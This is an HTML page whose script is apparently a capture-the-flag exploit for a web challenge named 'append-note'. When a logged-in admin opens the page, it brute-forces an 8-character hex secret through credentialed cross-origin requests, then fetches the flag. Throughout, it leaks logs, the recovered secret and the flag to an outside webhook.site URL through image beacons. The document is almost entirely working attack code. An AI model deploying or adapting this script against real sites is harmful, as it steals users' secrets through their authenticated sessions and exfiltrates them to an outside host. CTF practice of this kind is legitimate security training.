<!DOCTYPE html>
<html>
<head>
    <title>Append-Note Exploit</title>
</head>
<body>
    <h1>Append-Note Exploit</h1>
    <pre id="log"></pre>
    
    <script>
        // CONFIG - Change TARGET for local vs remote
        const TARGET = 'https://append-note-fqerb.instancer.lac.tf';
        const WEBHOOK = 'https://webhook.site/c71a4e87-4bc8-48b5-baff-03c29ee59baa';
        
        const HEX = '0123456789abcdef';
        let secret = '';
        let logEl = document.getElementById('log');
        
        function log(msg) {
            logEl.textContent += msg + '\n';
            console.log(msg);
            
            // Send to webhook using image (bypasses CORS)
            const img = new Image();
            img.src = `${WEBHOOK}?log=${encodeURIComponent(msg.substring(0,100))}&t=${Date.now()}`;
        }
        
        async function testChar(prefix, char) {
            const test = prefix + char;
            const url = `${TARGET}/append?content=${encodeURIComponent(test)}&url=${encodeURIComponent(TARGET + '/')}&_=${Date.now()}`;
            
            log(`  Testing: ${test}`);
            
            try {
                // Make request with admin cookie
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include', // Send cookies
                    mode: 'cors', // Try CORS first
                });
                
                // Try to check status
                log(`    Response type: ${response.type}, status: ${response.status}, ok: ${response.ok}`);
                
                // If we can read the status, use it
                if (response.status === 200 || response.ok) {
                    return true;
                } else if (response.status === 404 || response.status === 401) {
                    return false;
                }
                
                // If status is 0 (opaque), we can't tell - try no-cors
                return false;
                
            } catch (error) {
                log(`    Error: ${error.message}`);
                
                // Try again with no-cors mode
                try {
                    await fetch(url, {
                        method: 'GET',
                        credentials: 'include',
                        mode: 'no-cors'
                    });
                    
                    // With no-cors, we can't read anything
                    // This is a blind request
                    // We'll have to assume it worked and verify later
                    log(`    no-cors request sent`);
                    return null; // Unknown
                    
                } catch (e2) {
                    log(`    no-cors also failed: ${e2.message}`);
                    return false;
                }
            }
        }
        
        async function extract() {
            log('[*] Starting SECRET extraction...');
            log('[*] Target: ' + TARGET);
            log('');
            
            // Send start event
            const img = new Image();
            img.src = `${WEBHOOK}?event=start&target=${encodeURIComponent(TARGET)}`;
            
            for (let i = 0; i < 8; i++) {
                log(`[*] Finding character ${i + 1}/8...`);
                let found = false;
                
                for (const c of HEX) {
                    const result = await testChar(secret, c);
                    
                    if (result === true) {
                        secret += c;
                        log(`[+] FOUND: ${c} -> ${secret}`);
                        
                        const img2 = new Image();
                        img2.src = `${WEBHOOK}?secret=${secret}&pos=${i+1}&char=${c}`;
                        
                        found = true;
                        break;
                    } else if (result === null) {
                        log(`[?] Unknown result for ${c}, skipping`);
                    }
                    
                    // Small delay
                    await new Promise(r => setTimeout(r, 150));
                }
                
                if (!found) {
                    log(`[!] ERROR: No match found at position ${i+1}`);
                    const imgErr = new Image();
                    imgErr.src = `${WEBHOOK}?error=no_match&pos=${i+1}&partial=${secret}`;
                    return;
                }
                
                log('');
            }
            
            log('[+] Extraction complete!');
            log('[+] SECRET: ' + secret);
            log('');
            
            // Get flag
            await getFlag();
        }
        
        async function getFlag() {
            log('[*] Fetching flag...');
            
            try {
                // The /flag endpoint has CORS enabled (Access-Control-Allow-Origin: *)
                const response = await fetch(`${TARGET}/flag?secret=${secret}`);
                const flag = await response.text();
                
                log('[+] FLAG: ' + flag);
                
                // Send to webhook
                const img = new Image();
                img.src = `${WEBHOOK}?flag=${encodeURIComponent(flag)}&secret=${secret}`;
                
                // Display prominently
                document.body.innerHTML = `
                    <h1 style="color:green">🎉 SUCCESS! 🎉</h1>
                    <h2>FLAG: ${flag}</h2>
                    <h3>SECRET: ${secret}</h3>
                    <p>Check webhook for details!</p>
                `;
                
            } catch (error) {
                log('[!] Error getting flag: ' + error.message);
            }
        }
        
        // Start extraction when page loads
        window.addEventListener('load', () => {
            setTimeout(() => {
                extract().catch(err => {
                    log('[!] Fatal error: ' + err.message);
                    log(err.stack);
                });
            }, 1000);
        });
    </script>
</body>
</html>
